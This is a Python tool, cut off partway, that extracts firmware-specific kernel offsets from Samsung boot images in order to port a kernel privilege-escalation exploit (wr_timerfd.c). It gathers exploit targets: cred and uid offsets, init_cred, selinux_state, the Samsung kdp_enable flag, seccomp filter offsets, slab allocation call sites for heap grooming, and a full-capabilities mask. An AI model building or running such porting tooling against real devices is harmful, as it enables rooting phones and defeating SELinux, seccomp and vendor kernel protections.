#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-only
"""Extract the firmware-specific constants used by wr_timerfd.c.

Pass one or more Samsung firmware files.  Any mix is accepted:

  * AP/BL/CSC *.tar.md5 (the boot image inside the AP tar is used)
  * boot.img
  * boot.img.lz4
  * a raw ARM64 kernel Image

The tool unpacks the boot image, reconstructs a symbol table from the kernel
with vmlinux-to-elf, reads BTF and IKCONFIG, finds the allocation call sites,
and writes:

  port-out/<BUILD>/offsets.h
  port-out/<BUILD>/profile.json
  port-out/<BUILD>/report.txt
  port-out/<BUILD>/target.java.txt
  port-out/<BUILD>/System.map
  port-out/<BUILD>/kernel-config.txt
  port-out/<BUILD>/work/...          extracted boot.img / Image / vmlinux.elf

Run with --help for options.
"""

from __future__ import annotations

import argparse
import bz2
import gzip
import hashlib
import json
import lzma
import os
import re
import shutil
import struct
import subprocess
import sys
import tarfile
import time
from pathlib import Path

SCHEMA = 1
MASK64 = (1 << 64) - 1

BOOT_MAGIC = b"ANDROID!"
VENDOR_BOOT_MAGIC = b"VNDRBOOT"
ARM64_IMAGE_MAGIC = b"ARM\x64"

# Values that do not depend on the firmware image.  They are emitted into
# offsets.h so one header replaces the whole #define block in the exploit.
STATIC_DEFINES = {
    "WR_PIPE_FAKE_OFF": (0x28, "U"),
    "CALIB_MIN_COUNT": (200, "ULL"),
    "ASHMEM_NAME_LEN_": (256, ""),
    "ASHMEM_PREFIX_LEN": (11, ""),
    "ASHMEM_PREFIX_COUNT": (0x6D6873612F766564, "ULL"),
    "ASHMEM_SET_NAME_IOCTL": (0x41007701, "U"),
    "CHILD_HELLO": (0x52445931, ""),
    "CHILD_MAGIC": (0x50474552, ""),
    "SELINUX_SID_KERNEL": (1, "U"),
}

WARNINGS: list[str] = []


class PortError(RuntimeError):
    pass


def info(msg: str) -> None:
    print(msg, flush=True)


def warn(msg: str) -> None:
    WARNINGS.append(msg)
    print(f"warning: {msg}", file=sys.stderr, flush=True)


def u16(data: bytes, off: int) -> int:
    return struct.unpack_from("<H", data, off)[0]


def u32(data: bytes, off: int) -> int:
    return struct.unpack_from("<I", data, off)[0]


def u64(data: bytes, off: int) -> int:
    return struct.unpack_from("<Q", data, off)[0]


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


# ---------------------------------------------------------------------------
# Compression


def compression_kind(data: bytes) -> str | None:
    if data.startswith(b"\x1f\x8b"):
        return "gzip"
    if data[:4] in (b"\x04\x22\x4d\x18", b"\x02\x21\x4c\x18"):
        return "lz4"
    if data[:4] == b"\x28\xb5\x2f\xfd":
        return "zstd"
    if data.startswith(b"\xfd7zXZ\x00"):
        return "xz"
    if data.startswith(b"BZh"):
        return "bzip2"
    return None


def run_filter(cmd: list[str], data: bytes, what: str) -> bytes:
    exe = shutil.which(cmd[0])
    if not exe:
        raise PortError(f"{what} input given but {cmd[0]} is not installed")
    try:
        proc = subprocess.run(
            [exe, *cmd[1:]],
            input=data,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=300,
        )
    except subprocess.TimeoutExpired:
        raise PortError(f"{what} decompression timed out")
    if proc.returncode != 0:
        err = proc.stderr.decode("utf-8", "replace").strip()
        raise PortError(f"{what} decompression failed: {err or proc.returncode}")
    return proc.stdout


def decompress(data: bytes, kind: str) -> bytes:
    if kind == "gzip":
        return gzip.decompress(data)
    if kind == "xz":
        return lzma.decompress(data)
    if kind == "bzip2":
        return bz2.decompress(data)
    if kind == "lz4":
        try:
            import lz4.frame  # type: ignore

            return lz4.frame.decompress(data)
        except Exception:
            return run_filter(["lz4", "-dc"], data, "lz4")
    if kind == "zstd":
        try:
            import zstandard  # type: ignore

            return zstandard.ZstdDecompressor().decompress(data)
        except Exception:
            return run_filter(["zstd", "-dc", "-q"], data, "zstd")
    raise PortError(f"unknown compression {kind}")


def maybe_decompress(data: bytes) -> tuple[bytes, list[str]]:
    kinds: list[str] = []
    for _ in range(4):
        kind = compression_kind(data)
        if not kind:
            break
        data = decompress(data, kind)
        kinds.append(kind)
    return data, kinds


# ---------------------------------------------------------------------------
# Input discovery


BOOT_NAMES = {
    "boot.img": 3,
    "boot.img.lz4": 3,
    "init_boot.img": 1,
    "init_boot.img.lz4": 1,
    "vendor_boot.img": 1,
    "vendor_boot.img.lz4": 1,
}


def is_tar(path: Path) -> bool:
    try:
        return tarfile.is_tarfile(path)
    except OSError:
        return False


def tar_boot_members(path: Path, limit: int = 512 << 20) -> list[tuple[str, bytes]]:
    """Return boot-related members from a tar, without reading the others."""
    out: list[tuple[str, bytes]] = []
    try:
        with tarfile.open(path, "r:*") as tf:
            while True:
                member = tf.next()
                if member is None:
                    break
                if not member.isfile():
                    continue
                base = os.path.basename(member.name)
                if base not in BOOT_NAMES:
                    continue
                if member.size > limit:
                    warn(f"{path.name}:{member.name} is {member.size} bytes; skipping")
                    continue
                f = tf.extractfile(member)
                if f is None:
                    continue
                out.append((f"{path.name}:{member.name}", f.read()))
                # AP tars ship boot.img.lz4 first; do not scan the 24 GB rest.
                if base in ("boot.img", "boot.img.lz4"):
                    break
    except (tarfile.TarError, OSError) as exc:
        raise PortError(f"cannot read tar {path}: {exc}")
    return out


def parse_boot_image(data: bytes) -> dict | None:
    if not data.startswith(BOOT_MAGIC):
        return None
    if len(data) < 0x30:
        raise PortError("truncated Android boot image header")
    kernel_size = u32(data, 0x08)
    ramdisk_size = u32(data, 0x0C)
    header_version = u32(data, 0x28)
    if header_version >= 3:
        page_size = 4096
        kernel_off = 4096
        os_version = u32(data, 0x10) if len(data) >= 0x14 else 0
        cmdline_off, cmdline_len = 0x2C, 1536
        name = ""
    else:
        page_size = u32(data, 0x24)
        if page_size not in (2048, 4096, 8192, 16384):
            page_size = 2048
        kernel_off = page_size
        os_version = u32(data, 0x2C) if len(data) >= 0x30 else 0
        cmdline_off, cmdline_len = 0x40, 512 + 1024
        name = data[0x30:0x40].split(b"\0", 1)[0].decode("utf-8", "replace")
    if kernel_size == 0:
        return None
    end = kernel_off + kernel_size
    if end > len(data):
        warn(f"boot image kernel_size {kernel_size:#x} runs past end of file; truncating")
        end = len(data)
    kernel = data[kernel_off:end]
    cmdline = ""
    if cmdline_off + 8 <= len(data):
        cmdline = data[cmdline_off:cmdline_off + cmdline_len]
        cmdline = cmdline.split(b"\0", 1)[0].decode("utf-8", "replace")
    return {
        "header_version": header_version,
        "page_size": page_size,
        "kernel_size": kernel_size,
        "ramdisk_size": ramdisk_size,
        "os_version": os_version,
        "name": name,
        "cmdline": cmdline,
        "kernel": kernel,
    }


def looks_like_arm64_image(data: bytes) -> bool:
    return len(data) > 0x40 and data[0x38:0x3C] == ARM64_IMAGE_MAGIC


def classify_blob(data: bytes, source: str, workdir: Path) -> list[dict]:
    """Turn one input blob into zero or more kernel candidates."""
    raw, kinds = maybe_decompress(data)
    if kinds:
        info(f"  {source}: decompressed {' -> '.join(kinds)}")
    if raw.startswith(VENDOR_BOOT_MAGIC):
        info(f"  {source}: vendor_boot image (no kernel), ignored")
        return []
    boot = parse_boot_image(raw)
    if boot:
        kernel, kernel_kinds = maybe_decompress(boot["kernel"])
        if kernel_kinds:
            info(f"  {source}: kernel decompressed {' -> '.join(kernel_kinds)}")
        info(
            f"  {source}: boot image v{boot['header_version']}, "
            f"kernel {len(kernel)} bytes"
        )
        return [{
            "source": source,
            "priority": 6 if any(os.path.basename(source).endswith(n) for n in ("boot.img", "boot.img.lz4")) else 4,
            "kernel": kernel,
            "boot": boot,
            "raw_boot": raw,
        }]
    if raw.startswith(BOOT_MAGIC):
        info(f"  {source}: boot image without a kernel (init_boot), ignored")
        return []
    if looks_like_arm64_image(raw):
        info(f"  {source}: raw ARM64 kernel Image ({len(raw)} bytes)")
        return [{"source": source, "priority": 5, "kernel": raw, "boot": None, "raw_boot": None}]
    # Last resort: let vmlinux-to-elf try whatever this is.
    if len(raw) > 1 << 20:
        warn(f"{source}: not a recognized boot image; trying it as a raw kernel")
        return [{"source": source, "priority": 1, "kernel": raw, "boot": None, "raw_boot": None}]
    warn(f"{source}: unrecognized file ({len(raw)} bytes), ignored")
    return []


def gather_candidates(paths: list[str], workdir: Path) -> list[dict]:
    candidates: list[dict] = []
    for arg in paths:
        path = Path(arg).expanduser()
        if not path.exists():
            raise PortError(f"input not found: {path}")
        info(f"input: {path}")
        if is_tar(path):
            members = tar_boot_members(path)
            if not members:
                warn(f"{path.name}: no boot.img / boot.img.lz4 inside")
            for name, blob in members:
                candidates.extend(classify_blob(blob, name, workdir))
            continue
        if path.stat().st_size > (512 << 20):
            raise PortError(f"{path} is too large to be a boot image (use a .tar.md5)")
        candidates.extend(classify_blob(path.read_bytes(), path.name, workdir))
    if not candidates:
        raise PortError("no Android boot image or raw kernel found in the inputs")
    # De-duplicate by kernel hash, keeping the best priority.
    best: dict[str, dict] = {}
    for cand in candidates:
        digest = sha256_bytes(cand["kernel"])
        old = best.get(digest)
        if old is None or cand["priority"] > old["priority"]:
            best[digest] = cand
    unique = list(best.values())
    if len(unique) > 1:
        warn(
            "multiple different kernels found; using the highest-priority one "
            f"({unique[0]['source']})"
        )
    unique.sort(key=lambda c: (c["priority"], len(c["kernel"])), reverse=True)
    return unique


# ---------------------------------------------------------------------------
# ELF helper


class Elf:
    def __init__(self, path: Path):
        self.path = path
        self.data = path.read_bytes()
        d = self.data
        if d[:4] != b"\x7fELF" or d[4] != 2 or d[5] != 1:
            raise PortError(f"{path} is not a little-endian ELF64 file")
        self.phoff = u64(d, 0x20)
        self.shoff = u64(d, 0x28)
        self.phentsize = u16(d, 0x36)
        self.phnum = u16(d, 0x38)
        self.shentsize = u16(d, 0x3A)
        self.shnum = u16(d, 0x3C)
        self.shstrndx = u16(d, 0x3E)
        self.segments: list[tuple[int, int, int, int]] = []
        for i in range(self.phnum):
            off = self.phoff + i * self.phentsize
            p_type = u32(d, off)
            if p_type != 1:  # PT_LOAD
                continue
            p_offset = u64(d, off + 0x08)
            p_vaddr = u64(d, off + 0x10)
            p_filesz = u64(d, off + 0x20)
            p_memsz = u64(d, off + 0x28)
            if p_memsz:
                self.segments.append((p_vaddr, p_offset, p_filesz, p_memsz))
        self.sections: list[tuple[str, int, int]] = []
        if self.shoff and self.shnum and self.shstrndx < self.shnum:
            str_off = self.shoff + self.shstrndx * self.shentsize
            str_tab_off = u64(d, str_off + 0x18)
            str_tab_size = u64(d, str_off + 0x20)
            shstr = d[str_tab_off:str_tab_off + str_tab_size]
            for i in range(self.shnum):
                off = self.shoff + i * self.shentsize
                name_off = u32(d, off)
                sh_offset = u64(d, off + 0x18)
                sh_size = u64(d, off + 0x20)
                name = shstr[name_off:shstr.find(b"\0", name_off)].decode("utf-8", "replace")
                self.sections.append((name, sh_offset, sh_size))

    def read_vaddr(self, vaddr: int, size: int) -> bytes:
        for va, off, filesz, memsz in self.segments:
            if va <= vaddr < va + filesz:
                if vaddr + size <= va + filesz:
                    return self.data[off + (vaddr - va): off + (vaddr - va) + size]
                chunk = self.data[off + (vaddr - va): off + filesz]
                return chunk + b"\0" * (size - len(chunk))
            if va <= vaddr < va + memsz:
                return b"\0" * size
        raise PortError(f"vaddr {vaddr:#x} is not in any PT_LOAD segment")

    def read_cstr(self, vaddr: int, maxlen: int = 512) -> str:
        raw = self.read_vaddr(vaddr, maxlen)
        return raw.split(b"\0", 1)[0].decode("utf-8", "replace")


# ---------------------------------------------------------------------------
# Symbols


def load_symbols(elf_path: Path) -> tuple[dict[str, tuple[int, str]], list[tuple[int, str]]]:
    exe = shutil.which("nm")
    if not exe:
        raise PortError("nm is required (install binutils)")
    proc = subprocess.run(
        [exe, "-n", "--defined-only", str(elf_path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=300,
    )
    if proc.returncode != 0:
        raise PortError(f"nm failed: {proc.stderr.strip()}")
    symbols: dict[str, tuple[int, str]] = {}
    funcs: list[tuple[int, str]] = []
    for line in proc.stdout.splitlines():
        parts = line.split(None, 2)
        if len(parts) != 3:
            continue
        try:
            addr = int(parts[0], 16)
        except ValueError:
            continue
        typ, name = parts[1], parts[2]
        if not name:
            continue
        old = symbols.get(name)
        # Prefer a function symbol when a name is both a label and a function.
        if old is None or (typ in "tTwW" and old[1] not in "tTwW"):
            symbols[name] = (addr, typ)
        if typ in "tTwW":
            funcs.append((addr, name))
    funcs.sort()
    return symbols, funcs


def function_end(start: int, funcs: list[tuple[int, str]], fallback: int = 0x4000) -> int:
    for addr, _ in funcs:
        if addr > start:
            return addr
    return start + fallback


def ret_after_first_bl(
    elf: Elf,
    symbols: dict[str, tuple[int, str]],
    funcs: list[tuple[int, str]],
    func_name: str,
    targets: list[str],
) -> int:
    if func_name not in symbols:
        raise PortError(f"symbol not found: {func_name}")
    start = symbols[func_name][0]
    end = function_end(start, funcs)
    code = elf.read_vaddr(start, end - start)
    target_addrs = {symbols[t][0] for t in targets if t in symbols}
    if not target_addrs:
        raise PortError(f"none of {', '.join(targets)} found in symbol table")
    for i in range(0, len(code) - 3, 4):
        word = u32(code, i)
        if (word & 0xFC000000) != 0x94000000:  # AArch64 BL
            continue
        imm = word & 0x03FFFFFF
        if imm & 0x02000000:
            imm -= 0x04000000
        target = start + i + imm * 4
        if target in target_addrs:
            return start + i + 4  # return address recorded by ftrace
    names = ", ".join(targets)
    raise PortError(f"no bl to {names} found in {func_name}")


# ---------------------------------------------------------------------------
# BTF


BTF_KIND = {
    0: "UNKN",
    1: "INT",
    2: "PTR",
    3: "ARRAY",
    4: "STRUCT",
    5: "UNION",
    6: "ENUM",
    7: "FWD",
    8: "TYPEDEF",
    9: "VOLATILE",
    10: "CONST",
    11: "RESTRICT",
    12: "FUNC",
    13: "FUNC_PROTO",
    14: "VAR",
    15: "DATASEC",
    16: "FLOAT",
    17: "DECL_TAG",
    18: "TYPE_TAG",
    19: "ENUM64",
}


class BtfType:
    __slots__ = ("id", "kind", "name", "size", "members")

    def __init__(self, tid: int, kind: int, name: str, size: int, members: dict[str, tuple[int, int]]):
        self.id = tid
        self.kind = kind
        self.name = name
        self.size = size
        self.members = members


def btf_header_bounds(data: bytes, off: int) -> tuple[int, int, int, int, int] | None:
    if off < 0 or off + 24 > len(data):
        return None
    magic, version, _flags, hdr_len = struct.unpack_from("<HBBI", data, off)
    if magic != 0xEB9F or version != 1 or hdr_len < 24 or hdr_len > 4096:
        return None
    type_off, type_len, str_off, str_len = struct.unpack_from("<IIII", data, off + 8)
    if type_len < 256 or str_len < 256:
        return None
    end = off + max(hdr_len + type_off + type_len, hdr_len + str_off + str_len)
    if end > len(data):
        return None
    if data[off + hdr_len + str_off] != 0:
        return None
    return hdr_len, type_off, type_len, str_off, str_len


def find_btf(elf: Elf) -> tuple[int, tuple[int, int, int, int, int]] | None:
    for name, off, size in elf.sections:
        if name == ".BTF" and size:
            bounds = btf_header_bounds(elf.data, off)
            if bounds:
                return off, bounds
    best: tuple[int, tuple[int, int, int, int, int]] | None = None
    pos = 0
    needle = b"\x9f\xeb"
    while True:
        off = elf.data.find(needle, pos)
        if off < 0:
            break
        pos = off + 1
        bounds = btf_header_bounds(elf.data, off)
        if bounds is None:
            continue
        if best is None or bounds[2] > best[1][2]:
            best = (off, bounds)
    return best


def parse_btf(data: bytes, off: int, bounds: tuple[int, int, int, int, int]) -> dict[str, BtfType]:
    hdr_len, type_off, type_len, str_off, str_len = bounds
    types_start = off + hdr_len + type_off
    types_end = types_start + type_len
    strs = off + hdr_len + str_off
    strs_end = strs + str_len

    def s(name_off: int) -> str:
        if name_off >= str_len:
            return "?"
        end = data.find(b"\0", strs + name_off, strs_end)
        if end < 0:
            return "?"
        return data[strs + name_off:end].decode("utf-8", "replace")

    out: dict[str, BtfType] = {}
    pos = types_start
    tid = 1
    while pos < types_end:
        if pos + 12 > types_end:
            raise PortError(f"corrupt BTF type at {pos:#x}")
        name_off, info, size = struct.unpack_from("<III", data, pos)
        pos += 12
        vlen = info & 0xFFFF
        kind = (info >> 24) & 0x1F
        kflag = (info >> 31) & 1
        name = s(name_off)
        members: dict[str, tuple[int, int]] = {}
        if kind in (4, 5):
            for _ in range(vlen):
                if pos + 12 > types_end:
                    raise PortError(f"corrupt BTF struct {name} at {pos:#x}")
                m_name_off, _m_type, m_off = struct.unpack_from("<III", data, pos)
                pos += 12
                bit = (m_off & 0xFFFFFF) if kflag else m_off
                bits = (m_off >> 24) if kflag else 0
                m_name = s(m_name_off)
                if m_name:
                    members[m_name] = (bit // 8, bits)
            if name not in out:
                out[name] = BtfType(tid, kind, name, size, members)
        elif kind == 1:  # INT
            pos += 4
        elif kind == 3:  # ARRAY
            pos += 12
        elif kind == 6:  # ENUM
            pos += 8 * vlen
        elif kind == 13:  # FUNC_PROTO
            pos += 8 * vlen
        elif kind == 14:  # VAR
            pos += 4
        elif kind == 15:  # DATASEC
            pos += 12 * vlen
        elif kind == 17:  # DECL_TAG
            pos += 4
        elif kind == 19:  # ENUM64
            pos += 12 * vlen
        elif kind in (0, 2, 7, 8, 9, 10, 11, 12, 16, 18):
            pass
        else:
            raise PortError(f"unknown BTF kind {kind} at type {tid} ({BTF_KIND.get(kind, '?')})")
        tid += 1
    return out


# ---------------------------------------------------------------------------
# Kernel metadata


def arm64_header_info(kernel: bytes) -> dict:
    out = {"text_offset": None, "image_size": None, "flags": None}
    if looks_like_arm64_image(kernel):
        out["text_offset"] = u64(kernel, 0x08)
        out["image_size"] = u64(kernel, 0x10)
        out["flags"] = u64(kernel, 0x18)
    return out


def extract_config(kernel: bytes) -> tuple[str | None, dict[str, str]]:
    start = kernel.find(b"IKCFG_ST")
    if start < 0:
        return None, {}
    end = kernel.find(b"IKCFG_ED", start)
    if end < 0:
        return None, {}
    try:
        text = gzip.decompress(kernel[start + 8:end]).decode("utf-8", "replace")
    except OSError as exc:
        warn(f"IKCONFIG gzip failed: {exc}")
        return None, {}
    cfg: dict[str, str] = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, val = line.split("=", 1)
        cfg[key] = val
    return text, cfg


def cfg_bool(cfg: dict[str, str], key: str) -> bool | None:
    value = cfg.get(key)
    if value is None:
        return None
    return value == "y"


def derive_va_layout(cfg: dict[str, str]) -> tuple[int, int, int, list[str]]:
    notes: list[str] = []
    va_bits = None
    if "CONFIG_ARM64_VA_BITS" in cfg:
        try:
            va_bits = int(cfg["CONFIG_ARM64_VA_BITS"])
        except ValueError:
            pass
    for bits in (39, 48, 52):
        if va_bits is None and cfg.get(f"CONFIG_ARM64_VA_BITS_{bits}") == "y":
            va_bits = bits
    if va_bits is None:
        va_bits = 39
        notes.append("CONFIG_ARM64_VA_BITS missing; assuming 39")
    page_shift = 12
    try:
        page_shift = int(cfg.get("CONFIG_ARM64_PAGE_SHIFT", "12"))
    except ValueError:
        pass
    table = {
        39: (0xFFFFFF8000000000, 0xFFFFFFFE00000000),
        48: (0xFFFF000000000000, 0xFFFFEA0000000000),
        52: (0xFFF0000000000000, 0xFFD4000000000000),
    }
    if va_bits in table:
        linear, vmemmap = table[va_bits]
        if va_bits != 39:
            notes.append(f"VA_BITS={va_bits}: linear-map/vmemmap values are the standard arm64 layout")
    else:
        linear = (-(1 << va_bits)) & MASK64
        vmemmap = (-(1 << (va_bits - (page_shift - 6)))) & MASK64
        notes.append(f"VA_BITS={va_bits}: using computed layout; verify on hardware")
    return va_bits, linear, vmemmap, notes


def kmalloc_bucket(size: int) -> int:
    for bucket in (8, 16, 32, 64, 96, 128, 192, 256, 512, 1024, 2048, 4096, 8192):
        if size <= bucket:
            return bucket
    value = 8192
    while value < size:
        value <<= 1
    return value


def infer_build(paths: list[str]) -> str | None:
    preferred: list[str] = []
    fallback: list[str] = []
    for arg in paths:
        name = Path(arg).name
        bucket = preferred if name.startswith("AP_") else fallback
        for match in re.finditer(r"(?:^|_)([A-Z]{1,2}\d{3,4}[A-Z0-9]{6,14})(?=_|\.|$)", name):
            bucket.append(match.group(1))
    candidates = preferred or fallback
    if not candidates:
        return None
    # Samsung build ids contain at least one digit and are long.
    candidates.sort(key=len, reverse=True)
    return candidates[0]


def infer_model(build: str) -> str:
    m = re.match(r"^([A-Z]\d{3}[A-Z])", build)
    return f"SM-{m.group(1)}" if m else "unknown"


def infer_android(paths: list[str]) -> str | None:
    for arg in paths:
        m = re.search(r"(?:^|_)OS(\d+)(?:_|\.|$)", Path(arg).name, re.IGNORECASE)
        if m:
            return m.group(1)
    return None


def infer_soc(build: str) -> str:
    # Only add entries that are known for certain; unknown is better than wrong.
    table = {
        "S731": "Exynos 2400",
    }
    return table.get(build[:4], "unknown")


# ---------------------------------------------------------------------------
# Derivation


def derive(elf: Elf, symbols: dict[str, tuple[int, str]], funcs: list[tuple[int, str]],
           btf: dict[str, BtfType], cfg: dict[str, str], kernel: bytes,
           memstart_page: int) -> tuple[dict[str, tuple[int, str]], dict[str, str], dict]:
    values: dict[str, tuple[int, str]] = {}
    how: dict[str, str] = {}
    missing: list[str] = []

    def sym(name: str, required: bool = True) -> int | None:
        if name in symbols:
            return symbols[name][0]
        if required:
            missing.append(name)
        return None

    def btf_size(name: str) -> int:
        if name not in btf:
            missing.append(f"BTF struct {name}")
            return 0
        return btf[name].size

    def btf_off(struct: str, member: str) -> int:
        if struct not in btf:
            missing.append(f"BTF struct {struct}")
            return 0
        if member not in btf[struct].members:
            missing.append(f"BTF member {struct}.{member}")
            return 0
        return btf[struct].members[member][0]

    def add(name: str, value: int, desc: str, suffix: str = "ULL") -> None:
        values[name] = (value, suffix)
        how[name] = desc

    image_base = sym("_text")
    if image_base is None:
        raise PortError("symbol _text not found; cannot determine the link base")
    add("IMAGE_BASE", image_base, "_text")

    # Data symbols referenced by absolute address.
    absolute = {
        "ANON_PIPE_BUF_OPS_STATIC": "anon_pipe_buf_ops",
        "SELINUX_STATE_STATIC": "selinux_state",
        "PANIC_ON_WARN_STATIC": "panic_on_warn",
        "SYSCTL_BOOTID_STATIC": "sysctl_bootid",
        "ROOT_USER_STATIC": "root_user",
        "INIT_USER_NS_STATIC": "init_user_ns",
        "INIT_UCOUNTS_STATIC": "init_ucounts",
        "INIT_GROUPS_STATIC": "init_groups",
        "INIT_CRED_STATIC": "init_cred",
        "KDP_ENABLE_STATIC": "kdp_enable",
    }
    for macro, symbol in absolute.items():
        addr = sym(symbol)
        if addr is not None:
            add(macro, addr, symbol)

    # Image-relative offsets.
    image_rel = {
        "IMG_ASHMEM_MISC": ("ashmem_miscs",),
        "IMG_ASHMEM_FOPS": ("ashmem_fops",),
        "IMG_UHID_MISC": ("uhid_misc",),
        "IMG_UHID_FOPS": ("uhid_fops",),
        "IMG_NOOP_LLSEEK": ("noop_llseek", "no_llseek"),
        "IMG_CONFIGFS_READ_ITER": ("configfs_read_iter", "configfs_read_file"),
        "IMG_CONFIGFS_BIN_WRITE": ("configfs_bin_write_iter", "configfs_write_file"),
        "IMG_ASHMEM_IOCTL": ("ashmem_ioctl",),
        "IMG_ASHMEM_COMPAT_IOCTL": ("compat_ashmem_ioctl", "ashmem_compat_ioctl"),
        "IMG_ASHMEM_MMAP": ("ashmem_mmap",),
        "IMG_ASHMEM_OPEN": ("ashmem_open",),
        "IMG_ASHMEM_RELEASE": ("ashmem_release",),
        "IMG_COPY_SPLICE_READ": ("generic_file_splice_read", "copy_splice_read"),
        "IMG_ASHMEM_SHOW_FDINFO": ("ashmem_show_fdinfo",),
    }
    for macro, names in image_rel.items():
        addr = None
        used = None
        for name in names:
            if name in symbols:
                addr = symbols[name][0]
                used = name
                break
        if addr is None:
            missing.append(names[0])
        else:
            add(macro, addr - image_base, f"{used} - _text")

    # Allocation call sites.
    alloc = ["kmem_cache_alloc", "kmem_cache_alloc_noprof", "__kmem_cache_alloc"]
    alloc_node = ["kmem_cache_alloc_node", "kmem_cache_alloc_node_noprof", "__kmem_cache_alloc_node"]
    timer_site = ret_after_first_bl(elf, symbols, funcs, "do_timer_create", alloc)
    add("STATIC_TIMER_SITE", timer_site, "return address of first bl kmem_cache_alloc in do_timer_create")
    add("TIMER_SITE_LOW16", timer_site & 0xFFFF, "STATIC_TIMER_SITE & 0xffff")
    cred_site = ret_after_first_bl(elf, symbols, funcs, "prepare_ro_creds", alloc)
    add("CRED_RO_SITE_LOW21", cred_site & 0x1FFFFF, "return address of first bl kmem_cache_alloc in prepare_ro_creds & 0x1fffff")
    task_site = ret_after_first_bl(elf, symbols, funcs, "dup_task_struct", alloc_node)
    add("COPY_PROCESS_LOW16", task_site & 0xFFFF, "return address of first bl kmem_cache_alloc_node in dup_task_struct & 0xffff")

    # Struct sizes / member offsets from BTF.
    add("TIMER_ALLOC", btf_size("k_itimer"), "sizeof(struct k_itimer)")
    add("TASK_ALLOC_BYTES", btf_size("task_struct"), "sizeof(struct task_struct)")
    cred_req = btf_size("pipe_inode_info")
    add("CRED_REQ", cred_req, "sizeof(struct pipe_inode_info) (kmalloc request)")
    add("CRED_ALLOC", kmalloc_bucket(cred_req), "kmalloc bucket for CRED_REQ")
    add("CRED_UID_OFF", btf_off("cred", "uid"), "offsetof(struct cred, uid)")
    add("CRED_EUID_OFF", btf_off("cred", "euid"), "offsetof(struct cred, euid)")
    add("CRED_CAPEFF_OFF", btf_off("cred", "cap_effective"), "offsetof(struct cred, cap_effective)")
    add("OFF_TASK_CRED", btf_off("task_struct", "cred"), "offsetof(struct task_struct, cred)")
    add("OFF_TASK_SECCOMP", btf_off("task_struct", "seccomp"), "offsetof(struct task_struct, seccomp)")
    add("OFF_TASK_SECCOMP_FILT", btf_off("task_struct", "seccomp") + btf_off("seccomp", "filter"), "seccomp + offsetof(struct seccomp, filter)")
    add("OFF_TASK_ATOMIC_FLAGS", btf_off("task_struct", "atomic_flags"), "offsetof(struct task_struct, atomic_flags)")
    add("SELINUX_BLOB_OFF", btf_off("task_security_struct", "exec_sid"), "offsetof(struct task_security_struct, exec_sid)")
    add("STRUCT_PAGE_SIZE", btf_size("page"), "sizeof(struct page)")
    add("FOPS_SIZE", btf_size("file_operations"), "sizeof(struct file_operations)")
    add("IMG_MISC_FOPS_OFF", btf_off("miscdevice", "fops"), "offsetof(struct miscdevice, fops)")

    fops = {
        "FOPS_OFF_READ": "read",
        "FOPS_OFF_WRITE": "write",
        "FOPS_OFF_READ_ITER": "read_iter",
        "FOPS_OFF_WRITE_ITER": "write_iter",
        "FOPS_OFF_IOCTL": "unlocked_ioctl",
        "FOPS_OFF_COMPAT": "compat_ioctl",
        "FOPS_OFF_MMAP": "mmap",
        "FOPS_OFF_OPEN": "open",
        "FOPS_OFF_RELEASE": "release",
        "FOPS_OFF_SPLICE": "splice_read",
        "FOPS_OFF_FDINFO": "show_fdinfo",
    }
    for macro, member in fops.items():
        add(macro, btf_off("file_operations", member), f"offsetof(struct file_operations, {member})")

    cfg_fields = {
        "CFG_OFF_PAGE": "page",
        "CFG_OFF_NEEDS_FILL": "needs_read_fill",
        "CFG_OFF_BIN_BUFFER": "bin_buffer",
        "CFG_OFF_BIN_SIZE": "bin_buffer_size",
        "CFG_OFF_CB_MAX": "cb_max_size",
    }
    for macro, member in cfg_fields.items():
        add(macro, btf_off("configfs_buffer", member), f"offsetof(struct configfs_buffer, {member})")

    # init_uts_ns.nodename
    init_uts = sym("init_uts_ns")
    if init_uts is not None:
        nodename = btf_off("uts_namespace", "name") + btf_off("new_utsname", "nodename")
        add("INIT_UTS_NODENAME_STATIC", init_uts + nodename, "init_uts_ns + offsetof(nodename)")

    # cap_last_cap is a data symbol containing the highest capability number.
    cap = sym("cap_last_cap", required=False)
    cap_value = None
    if cap is not None:
        try:
            cap_value = u32(elf.read_vaddr(cap, 4), 0)
        except PortError:
            cap_value = None
    if cap_value is None or not (0 < cap_value < 64):
        cap_value = 40
        warn("cap_last_cap unreadable; assuming 40 (Linux 6.1)")
    add("FULLCAP", (1 << (cap_value + 1)) - 1, f"(1 << (cap_last_cap + 1)) - 1; cap_last_cap={cap_value}", "ULL")

    # VA layout and board address.
    va_bits, linear, vmemmap, notes = derive_va_layout(cfg)
    for note in notes:
        warn(note)
    add("LINEAR_MAP_BASE", linear, f"arm64 PAGE_OFFSET for VA_BITS={va_bits}")
    add("VMEMMAP_BASE", vmemmap, f"arm64 VMEMMAP for VA_BITS={va_bits}")
    add("MEMSTART_PAGE", memstart_page, "runtime memstart_addr >> 12 (not derivable offline)", "ULL")
    warn(f"MEMSTART_PAGE is board runtime data; using {memstart_page:#x} (change with --memstart-page if needed)")

    if missing:
        unique = sorted(set(missing))
        raise PortError("missing symbols/BTF information:\n  " + "\n  ".join(unique))

    meta = {
        "va_bits": va_bits,
        "cap_last_cap": cap_value,
        "timer_site": timer_site,
        "cred_site": cred_site,
        "task_site": task_site,
    }
    return values, how, meta


# ---------------------------------------------------------------------------
# Output


def fmt_value(value: int, suffix: str) -> str:
    if suffix == "":
        return f"0x{value:x}"
    return f"0x{value:x}{suffix}"


DECIMAL_STATICS = {"CALIB_MIN_COUNT", "ASHMEM_NAME_LEN_", "ASHMEM_PREFIX_LEN"}


def write_offsets_header(path: Path, build: str, kernel_version: str,
                         values: dict[str, tuple[int, str]]) -> None:
    guard = re.sub(r"[^A-Za-z0-9_]", "_", build)
    order = [
        "STATIC_TIMER_SITE", "TIMER_SITE_LOW16", "TIMER_ALLOC",
        "LINEAR_MAP_BASE", "VMEMMAP_BASE", "MEMSTART_PAGE", "STRUCT_PAGE_SIZE",
        "ANON_PIPE_BUF_OPS_STATIC", "WR_PIPE_FAKE_OFF",
        "CRED_REQ", "CRED_ALLOC", "CRED_RO_SITE_LOW21",
